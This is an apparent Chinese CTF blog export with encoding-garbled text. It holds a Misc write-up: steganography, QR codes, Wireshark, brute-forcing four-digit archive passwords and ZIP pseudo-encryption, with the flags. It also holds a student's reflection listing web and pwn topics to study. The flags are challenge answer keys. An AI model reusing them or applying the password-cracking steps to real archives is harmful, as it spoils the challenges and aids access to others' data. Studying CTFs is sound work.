é¸Ÿé•‡ï¼š</h2><pre><code>é¢˜ç›®æè¿°ï¼š(ä¸çŸ¥é“ä¸ºå•¥ï¼Œè¿™éƒ¨åˆ†ä¸è®©å†™)ï¼Œä»–ä»¬çš„ç…§ç‰‡é‡Œéšè—ç€ä»€ä¹ˆä¿¡æ¯å‘¢ï¼Ÿå›¾ç‰‡æ²¡å•¥å†…å®¹ï¼Œå±æ€§é‡Œä¹Ÿæ²¡çœ‹å‡ºæ¥å•¥ï¼Œç›´æ¥è®°äº‹æœ¬æ‰“å¼€ï¼Œæœç´¢flagï¼Œæœ€åæ‰¾åˆ°flagï¼šflag&#123;97314e7864a8f62627b26f3f998c37f1&#125;</code></pre><h2 id="7nç§æ–¹æ³•è§£å†³"><a class="markdownIt-Anchor" href="#7nç§æ–¹æ³•è§£å†³">#</a> 7.N ç§æ–¹æ³•è§£å†³:</h2><pre><code>é™„ä»¶æ˜¯ä¸ªexeæ–‡ä»¶ï¼Œæ‰“å¼€æ˜¯æ— æ³•æ‰“å¼€çš„ï¼ŒæŒ‰ç…§æˆ‘ä»¥å‰çš„åšæ³•ï¼Œåº”è¯¥æ˜¯ç›´æ¥IDAæ‰“å¼€ï¼Œä½†æ˜¯æ‰“å¼€æ˜¯ä¸€å †å•¥ç©æ„å„¿ï¼Œçœ‹èµ·æ¥å•¥ç”¨éƒ½æ²¡æœ‰ï¼Œå¥½å§ã€‚è€è§„çŸ©ï¼Œè®°äº‹æœ¬æ‰“å¼€ï¼Œå‘ç°æ˜¯ä¸€ä¸ªå›¾ç‰‡çš„base64ç¼–ç ï¼š</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:image/jpg;base64,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</span><br></pre></td></tr></table></figure><pre><code>ç›´æ¥æ‹–åˆ°æµè§ˆå™¨ä¸­ï¼Œç„¶åæ˜¯ä¸ªäºŒç»´ç ï¼Œæ‰«æäºŒç»´ç ä¹‹åå¾—åˆ°flagï¼šKEY&#123;dca57f966e4e4e31fd5b15417da63269&#125;</code></pre><h2 id="8wireshark"><a class="markdownIt-Anchor" href="#8wireshark">#</a> 8.wiresharkï¼š</h2><pre><code>é¢˜ç›®æ˜¯ä¸ªæµé‡åŒ…ï¼ŒçŒœæµ‹ç›®çš„æµé‡åŒ…åº”è¯¥æ˜¯åœ¨httpæˆ–è€…httpsåè®®åŒ…ä¸­ï¼Œé‚£ä¹ˆè¿‡æ»¤httpåè®®å†çœ‹çœ‹ï¼š</code></pre><p><img data-src="https://img-blog.csdnimg.cn/direct/9a92da7ed6184f04b141197f71a8e147.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><pre><code>ç¬¬ä¸‰è¡Œå‘ç°ä¸€ä¸ªPOSTåŒ…ï¼Œè·Ÿè¿›çœ‹çœ‹ï¼š</code></pre><p><img data-src="https://img-blog.csdnimg.cn/direct/72b07a3455d8486db4d2e28a24abf4d3.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><pre><code>æœ€åæˆåŠŸæ‰¾åˆ°äº†flag  ï¼š  flag&#123;ffb7567a1d4f4abdffdb54e022f8facd&#125;</code></pre><h2 id="9åŸºç¡€ç ´è§£"><a class="markdownIt-Anchor" href="#9åŸºç¡€ç ´è§£">#</a> 9. åŸºç¡€ç ´è§£</h2><pre><code>é¢˜ç›®æè¿°ï¼šç»™ä½ ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œä½ å¹¶ä¸èƒ½è·å¾—ä»€ä¹ˆï¼Œå› ä¸ºä»–æ˜¯å››ä½æ•°å­—åŠ å¯†çš„å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆã€‚ã€‚ã€‚ä¸å¯¹= =æˆ‘è¯´äº†ä»€ä¹ˆäº†ä¸å¾—çš„ä¸œè¥¿ã€‚ã€‚ARCHPRå››ä½æ•°å¯†ç çˆ†ç ´ï¼Œä¸€æŠŠæ¢­ï¼Œæ‰¾åˆ°å¯†ç ä¸º2563ï¼Œä¹‹åè§£å‹è¿‡åå¾—åˆ°äº†ä¸ªtxtæ–‡ä»¶ï¼Œå†…å®¹æ˜¯ï¼š</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3s3MDM1NDMwMGE1MTAwYmE3ODA2ODgwNTY2MWI5M2E1Y30=</span><br></pre></td></tr></table></figure><pre><code>ä¸€çœ¼base64ï¼Œè§£ç åå¾—åˆ°flagï¼š  flag&#123;70354300a5100ba78068805661b93a5c&#125;</code></pre><h2 id="10æ–‡ä»¶ä¸­çš„ç§˜å¯†"><a class="markdownIt-Anchor" href="#10æ–‡ä»¶ä¸­çš„ç§˜å¯†">#</a> 10. æ–‡ä»¶ä¸­çš„ç§˜å¯†ï¼š</h2><pre><code>é¢˜ç›®æè¿°ï¼šå°æ˜ç»å¸¸å–œæ¬¢åœ¨æ–‡ä»¶ä¸­è—ä¸€äº›ç§˜å¯†ã€‚æ—¶é—´ä¹…äº†ä¾¿å¿˜è®°äº†ï¼Œä½ èƒ½å¸®å°æ˜æ‰¾åˆ°è¯¥æ–‡ä»¶ä¸­çš„ç§˜å¯†å—ï¼Ÿæ–‡ä»¶ä¸­çš„ç§˜å¯†ï¼Œé‚£ä¹ˆæ¨æµ‹åº”è¯¥æ˜¯éšå†™ï¼Œå…ˆæŸ¥çœ‹æ–‡ä»¶å±æ€§è¯•è¯•çœ‹ï¼Œæœ€ååœ¨è¯¦ç»†ä¿¡æ¯é‡Œæ‰¾åˆ°äº†flagï¼š flag&#123;870c5a72806115cb5439345d8b014396&#125;</code></pre><h2 id="11l-s-b"><a class="markdownIt-Anchor" href="#11l-s-b">#</a> 11.L S Bï¼š</h2><pre><code>è¿™æ˜¯ä¸€ä¸ªå›¾ï¼Œçœ‹ä¸Šå»æ²¡å•¥ç”¨ï¼Œæ ¹æ®é¢˜ç›®ï¼Œåº”è¯¥æ˜¯L S Béšå†™ï¼Œé‚£ä¹ˆç›´æ¥ä¸ŠStegsolveã€‚å‹¾é€‰è¿™å‡ ä¸ªé€‰é¡¹</code></pre><p><img data-src="https://img-blog.csdnimg.cn/direct/de50050858db4177acd11f838754f086.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><pre><code>ç„¶åä¿å­˜å›¾ç‰‡ï¼Œæ”¹åç¼€ä¸ºpngï¼Œç„¶åç›´æ¥æ‰«äºŒç»´ç å¾—åˆ°flagï¼š  flag&#123;&#123;1sb_i4_s0_Ea4y&#125;&#125;</code></pre><h2 id="12zipä¼ªåŠ å¯†"><a class="markdownIt-Anchor" href="#12zipä¼ªåŠ å¯†">#</a> 12.zip ä¼ªåŠ å¯†ï¼š</h2><pre><code>é™„ä»¶æ˜¯ä¸€ä¸ªåŠ äº†å¯†çš„å‹ç¼©åŒ…ï¼Œé€šè¿‡010Editoræ‰“å¼€</code></pre><p><img data-src="https://img-blog.csdnimg.cn/direct/f51667f74a544b16be996503c2b62061.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><pre><code>è¿™å„¿çš„ä¸¤ä¸ª0900ä¿®æ”¹ä¸º0000ï¼Œä¿å­˜ä¹‹åç›´æ¥è§£å‹ï¼Œå®Œäº‹å„¿äº†ã€‚</code></pre><h2 id="13è¢«å—…æ¢çš„æµé‡"><a class="markdownIt-Anchor" href="#13è¢«å—…æ¢çš„æµé‡">#</a> 13. è¢«å—…æ¢çš„æµé‡ï¼š</h2><pre><code>æ— è„‘è¿‡æ»¤ftpï¼Œå‘ç°æ²¡æœ‰å†…å®¹ï¼Œå†æ— è„‘è¿‡æ»¤httpåè®®ï¼Œå‘ç°æœ‰å‡ ä¸ªå†…å®¹ï¼Œåœ¨è¿™å‡ ä¸ªå†…å®¹ä¸­çœ‹åˆ°äº†ä¸ªè¯·æ±‚ï¼Œæ¨æµ‹è·å–çš„å†…å®¹æ˜¯ä¸€ä¸ªå›¾ç‰‡ï¼Œç„¶åè·Ÿéšè¿™ä¸ªè¯·æ±‚ï¼Œæœ€åå¾—åˆ°äº†flagï¼š</code></pre><p><img data-src="https://img-blog.csdnimg.cn/direct/0488c1498e724c6f8df812e22aaafc31.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="14rar"><a class="markdownIt-Anchor" href="#14rar">#</a> 14.rarï¼š</h2><pre><code>é¢˜ç›®æè¿°ï¼šè¿™ä¸ªæ˜¯ä¸€ä¸ªraræ–‡ä»¶ï¼Œé‡Œé¢å¥½åƒéšè—ç€ä»€ä¹ˆç§˜å¯†ï¼Œä½†æ˜¯å‹ç¼©åŒ…è¢«åŠ å¯†äº†ï¼Œæ¯«æ— ä¿ç•™çš„å‘Šè¯‰ä½ ï¼Œrarçš„å¯†ç æ˜¯4ä½çº¯æ•°å­—ã€‚è€è§„çŸ©ï¼Œç›´æ¥ç”¨ARCHPRå››ä½æ•°æ•°å­—å¯†ç ä¸€æŠŠæ¢­ï¼Œå¾—åˆ°å¯†ç ä¸º8795ï¼Œæœ€åå¾—åˆ°flag ï¼š flag&#123;1773c5da790bd3caff38e3decd180eb7&#125;</code></pre><h2 id="15qr"><a class="markdownIt-Anchor" href="#15qr">#</a> 15.qrï¼š</h2><pre><code>é¢˜ç›®æè¿°ï¼šè¿™æ˜¯ä¸€ä¸ªäºŒç»´ç ï¼Œè°ç”¨è°çŸ¥é“ï¼äºŒç»´ç ï¼Œæ‰«å°±å®Œäº‹å„¿äº†ï¼Œflag&#123;878865ce73370a4ce607d21ca01b5e59&#125;</code></pre><h2 id="16é•œå­é‡Œé¢çš„ä¸–ç•Œ"><a class="markdownIt-Anchor" href="#16é•œå­é‡Œé¢çš„ä¸–ç•Œ">#</a> 16. é•œå­é‡Œé¢çš„ä¸–ç•Œ:</h2><p><img data-src="https://img-blog.csdnimg.cn/direct/e4b5f99147c840178ed7c7a0e9dfd1ce.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><pre><code>æ ¹æ®é™„ä»¶åå­—ï¼Œstegï¼Œæ¨æµ‹åº”è¯¥æ˜¯ç”¨Stegsolveæ¥æ‰“å¼€ï¼Œæ‰€ä»¥ï¼Œé¦–å…ˆç›´æ¥data extractæœ€ä½ä½éšå†™ï¼Œå¾—åˆ°ç»“æœï¼š</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">4865792049207468 696e6b2077652063  Hey I th ink we c</span><br><span class="line">616e207772697465 20736166656c7920  an write  safely </span><br><span class="line">696e207468697320 66696c6520776974  in this  file wit</span><br><span class="line">686f757420616e79 6f6e652073656569  hout any one seei</span><br><span class="line">6e672069742e2041 6e797761792c2074  ng it. A nyway, t</span><br><span class="line">6865207365637265 74206b6579206973  he secre t key is</span><br><span class="line">3a2073743367305f 7361757275735f77  : st3g0_ saurus_w</span><br><span class="line">7233636b73000000 0000000000000000  r3cks... ........</span><br></pre></td></tr></table></figure><pre><code>flag    :        flag&#123;st3g0_saurus_wr3cks&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> æ‚ä¸ƒæ‚å…«çš„çŸ¥è¯†ç‚¹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å°å°çš„æ€»ç»“ï¼ˆæ—¥å¸¸å‘ç™«ï¼‰</title>
      <link href="/posts/7232a36b.html"/>
      <url>/posts/7232a36b.html</url>
      
        <content type="html"><![CDATA[<h1 id="æ€»åœ°çœ‹çœ‹è¿™ä¸ªå­¦æœŸ"><a class="markdownIt-Anchor" href="#æ€»åœ°çœ‹çœ‹è¿™ä¸ªå­¦æœŸ">#</a> æ€»åœ°çœ‹çœ‹è¿™ä¸ªå­¦æœŸï¼š</h1><p>â€‹çœ¨çœ¼ä¹‹é—´ï¼Œæˆ‘ç­‰çš„ä¸€ä¸ªæ¸¸æˆå¿«è¦å…¬æµ‹äº†ï¼ŒåŸæ¥æ˜¯åˆ°äº†äº”æœˆäº†ã€‚æ—¶é—´è¿‡å¾—çœŸå¿«ï¼Œè¿™ä¸ªå­¦æœŸæ„Ÿè§‰å•¥éƒ½æ²¡å­¦å°±å¿«è¦ç»“æŸäº†ã€‚</p><p>â€‹æƒ³äº†æƒ³è¿™ä¸ªå­¦æœŸåˆšå¼€æ ¡é‚£ä¼šå„¿ï¼Œä¸€ä¸ªæœˆä¸‹æ¥æ‰åªå­¦äº†ä¸ªæ— åˆ—åæ³¨å…¥ï¼Œæ€»æ„Ÿè§‰æ²¡å•¥åŠ¨åŠ›ï¼Œå¾ˆé¢“åºŸï¼Œç›´åˆ°ç°åœ¨ä¹Ÿæ˜¯ä¸€æ ·ï¼Œé™¤äº†æ‘¸é±¼å°±æ˜¯æ‘¸é±¼ï¼Œæ„Ÿè§‰ä¸ä»…è¿·èŒ«ï¼Œè¿˜æ²¡å•¥åŠ¨åŠ›ã€‚æœ€åæƒ³äº†æƒ³ï¼Œå¯èƒ½æ˜¯å› ä¸ºæˆ‘ä¸çŸ¥é“å­¦äº›å•¥äº†å§ã€‚å¹¶ä¸æ˜¯å› ä¸ºæˆ‘æŒæ¡äº†ï¼Œè€Œæ˜¯å› ä¸ºå­¦ä¸æ‡‚ï¼Œæ‰ä¸çŸ¥é“å’‹å­¦ï¼Œé™·å…¥äº†ä¸€ç§æ­»å¾ªç¯ï¼Œæ¥è§¦äº† Pwn ä»¥åæ›´æ˜¯å¦‚æ­¤ï¼Œä½†æ˜¯ï¼Œæˆ‘åˆæ²¡æœ‰å•¥åŠæ³•ï¼ŒWeb åˆ°äº†ç°åœ¨æ„Ÿè§‰æœ‰ç‚¹æŠ½è±¡äº†ï¼Œåšé¢˜åŸºæœ¬ä¸Šéƒ½æ²¡å•¥æ€è·¯ï¼Œå¤§éƒ¨åˆ†éƒ½æ˜¯é  wp æ‰èƒ½æˆåŠŸå¤ç°å‡ºæ¥ï¼Œç”šè‡³ä¸€äº›å¾ˆåŸºç¡€çš„è€ƒç‚¹æˆ‘éƒ½æƒ³ä¸åˆ°ï¼Œæ„Ÿè§‰åˆ°äº†ä¸€ä¸ªæ€ä¹ˆå­¦éƒ½ä¸Šä¸å»çš„å¢ƒåœ°ã€‚</p><p>â€‹è¶Šæ„Ÿè§‰å­¦ä¸æ‡‚ï¼Œå°±è¶Šæ²¡åŠ¨åŠ›ï¼Œå­¦å¾—è¶Šå°‘ï¼Œç„¶åè¶Šå­¦ä¸æ‡‚ï¼Œæ­»å¾ªç¯ä¸‹å»äº†ã€‚å¥½åœ¨ï¼Œæˆ‘æœ€è¿‘çªç„¶æ„è¯†åˆ°ï¼Œå»æ‰“æ‰“æ¯”èµ›ï¼Œä¸é˜Ÿå‹äº¤æµäº¤æµå¯¹æˆ‘å¥½åƒæœ‰ä¸å°çš„å¸®åŠ©ï¼Œåœ¨å„ç§æ–¹é¢éƒ½ç»™äº†æˆ‘ä¸å°çš„ä¹è¶£ï¼Œè‡ªä»é˜Ÿé‡ŒåŒå¹´çº§çš„äººå¤šèµ·æ¥ä¹‹åï¼Œæ„Ÿè§‰è¶Šæ¥è¶Šæœ‰å­¦çš„åŠ¨åŠ›äº†ï¼Œç›¸äº’ä¹‹é—´è°ƒä¾ƒï¼Œç›¸äº’ä¹‹é—´äº¤æµï¼Œä½¿åŸæœ¬æ¯ç‡¥ä¹å‘³çš„å­¦ä¹ è¿‡ç¨‹å˜å¾—ç¨å¾®æœ‰äº†ç‚¹ä¹è¶£ï¼Œæ„Ÿè§‰ç´¯äº†çš„æ—¶å€™ç¨å¾®ä¼‘æ¯ä¼‘æ¯ï¼Œè·Ÿç¾¤é‡Œçš„æŸä¸ªç”·ç«¥é‹æ¥ä¸€å¥ â€œå…„å¼Ÿï¼Œä½ å¥½é¦™ã€‚â€ è™½è¯´æ²¡æœ‰å¾ˆæ˜æ˜¾çš„è½»æ¾äº†çš„æ„Ÿè§‰ï¼Œè‡³å°‘å½“ä»–ä»¬å›å¤äº†æˆ‘çš„è¯çš„è¯ï¼Œè¿˜æ˜¯ä¼šæŒºå¼€å¿ƒçš„ï¼Œè™½è¯´æ•´ä¸ªç¾¤é‡Œçš„äººæ„Ÿè§‰åŸºæœ¬ä¸Šéƒ½æ‹¿æˆ‘å¼€åˆ€ï¼Œéƒ½æ¬ºè´Ÿæˆ‘ï¼Œå‘œå‘œå‘œã€‚</p><p>â€‹è‡ªä»ä¸Šå­¦æœŸå¼€å§‹æ¥è§¦ pwn åˆ°ç°åœ¨ï¼Œæ„Ÿè§‰ä¹‹åçš„è·¯çº¿è¶Šæ¥è¶Šæ‡µé€¼ï¼Œè¿™ç©æ„å„¿è¿™ä¹ˆéš¾ tnnd é‚£äº›å¤§ä½¬åˆ°åº•æ˜¯å’‹å­¦è¿›å»çš„ï¼Ÿä»æœ€å¼€å§‹çš„ ELF æ–‡ä»¶ç»“æ„å°±å¼€å§‹æ‡µé€¼ï¼Œä¸€ç›´åˆ°ç°åœ¨çš„ heap åˆ©ç”¨ï¼Œæƒ³ä»€ä¹ˆ UAFï¼Œä»€ä¹ˆ Double Freeï¼ŒHook åŠ«æŒä»€ä¹ˆçš„ï¼ŒåŸºæœ¬ä¸Šéƒ½çœ‹ä¸æ‡‚ï¼Œå•Šï¼ï¼ï¼å‰ç¨‹ä¸€ç‰‡é»‘æš—å•Šã€‚</p><p>â€‹ä¸è¿‡ï¼Œåœ¨å¯’å‡é‚£ä¼šæŠŠ ret2libc å­¦å®Œäº†ä¹‹åï¼Œè¿™å­¦æœŸè¿˜æ²¡å•¥è¿›æ­¥ï¼Œå½“ç„¶ï¼Œè¿™ä¹Ÿæ˜¯å› ä¸ºæˆ‘ä¸¤ä¸ªæ–¹å‘çš„åŸå› å§ï¼ŒWeb ç°å¦‚ä»Šä¹Ÿå¼€å§‹ä¸€è¾¹è¡¥ä¹‹å‰çš„é—æ¼çš„çŸ¥è¯†ä»¥åŠå­¦ä¹ åŸºç¡€æ¼æ´ï¼Œä¸€è¾¹å¼€å§‹ java å¼€å‘ï¼Œä½†æ˜¯ javaWeb ç›¸è¾ƒè€Œè¨€å¯¹æˆ‘å¤ªè¿‡æŠ½è±¡äº†ï¼Œæœ‰ç‚¹é€†å¤©ã€‚ä¸è¿‡ä¹Ÿæ²¡æœ‰å•¥å¥½åŠæ³•ï¼Œæš‘å‡æ…¢æ…¢å·å§ï¼Œä¸å¯¹ï¼Œæ…¢æ…¢ç©å„¿ï¼Œä¸èƒ½å·ï¼Œå˜¿å˜¿ã€‚</p><h1 id="ä¹‹åè¯¥å¹²äº›å•¥"><a class="markdownIt-Anchor" href="#ä¹‹åè¯¥å¹²äº›å•¥">#</a> ä¹‹åè¯¥å¹²äº›å•¥ï¼Ÿ</h1><p>â€‹æˆ‘æƒ³äº†æƒ³ï¼Œè¿˜æ˜¯éœ€è¦ç»™è‡ªå·±åšä¸ªå¤§è‡´çš„è·¯çº¿è§„åˆ’ï¼š</p><p>Web æ–¹å‘ï¼š</p><ul><li>è¿˜æ˜¯å¾—å…ˆæŠŠ JavaWeb å¼€å‘ç»™å­¦å¥½ï¼Œè¿™æ˜¯ç¬¬ä¸€ç›®æ ‡ã€‚</li><li>å¤ç°å¤ç°ä¹‹å‰çš„æŸäº›é¢˜ç›®ï¼Œå°¤å…¶æ˜¯å›½èµ›ä¹‹ç±»çš„éš¾åº¦æœ‰ç‚¹é«˜çš„é¢˜ï¼Œæ ¹æ®é‚£äº›éš¾åº¦æœ‰ç‚¹é«˜çš„é¢˜ç›®å¼€å§‹ï¼Œå·®å“ªäº›çŸ¥è¯†å­¦å“ªäº›ã€‚</li><li>ä¸è¦å¿˜äº†ä¹‹å‰çš„åŸºç¡€æ¼æ´ï¼Œè¯¥å¤ä¹ äº†ï¼Œåƒæ˜¯ ssrfï¼Œxxeï¼Œxssï¼Œcsrfï¼Œsstiï¼ˆå°¤å…¶æ˜¯å†…å­˜é©¬ï¼‰ï¼Œè¿˜æœ‰ä¾‹å¦‚ flask æ¡†æ¶çš„æŸä¸ªæ¼æ´ï¼Œå¤§æ¦‚æ˜¯è¿ç»´èµ›é‚£ä¼šå„¿çš„é‚£ä¸ªé¢˜ç›®ï¼Œä¸€ä¸ª flask çš„å†å²æ¼æ´å§ã€‚</li><li>ä¸è¦å¿˜äº†åŸºç¡€è¯­è¨€ï¼ŒæŸäº›è¯­è¨€è¿˜å¾—å­¦äº›è¿›é˜¶çš„å†…å®¹ï¼Œä¸ç„¶æ ¹æœ¬æ‰“ä¸äº†ï¼Œå®¡è®¡ flask ä»€ä¹ˆçš„æˆ‘åŸºæœ¬ä¸Šçœ‹åˆ°äº†ç›´æ¥åºŸï¼Œä¸æ˜¯å¾ˆèƒ½ç†è§£ï¼Œåªèƒ½æ‡‚ä¸ªå¤§æ¦‚ã€‚</li><li>æœ€åæ˜¯ä¸€äº›æ¡†æ¶ï¼Œåƒæ˜¯ thinkPHPï¼ŒCMSï¼Œç­‰ç­‰ã€‚</li></ul><p>Pwn æ–¹å‘ï¼š</p><ul><li>å¯¹äºæ ˆæº¢å‡ºçš„ä¿æŠ¤ä»¥åŠä¸€äº›è¿›é˜¶ ROP å’ŒèŠ±å¼æ ˆæº¢å‡ºï¼Œæˆ‘è¿˜å¾—å­¦ä¸€æ‰‹ï¼Œè¿™ä¸ªå¤ªé‡è¦äº†ã€‚</li><li>ret2csu ä¸å¤ªç†Ÿæ‚‰ï¼Œret2dl ä»€ä¹ˆçš„ä¹Ÿä¸å¤§ä¼šï¼ŒBROP å¯ä»¥æä¸€æ‰‹ã€‚</li><li>ä¼ªéšæœºæ•°ç»•è¿‡æˆ‘è¿˜æ²¡é‡åˆ°è¿‡ï¼Œéœ€è¦æ‰¾æ‰¾ç›¸å…³çš„æ–‡ç« å’Œé¢˜ç›®ã€‚</li><li>æ•´æ•°æº¢å‡ºï¼Œä¸å¤§ä¼šç”¨ï¼Œå¦‚æœç‰µæ‰¯åˆ°äº†è¿™ä¸ªç‚¹å¯èƒ½è€ƒè™‘ä¸åˆ°ï¼Œå¾—æä¸€æ‰‹ã€‚</li><li>æ 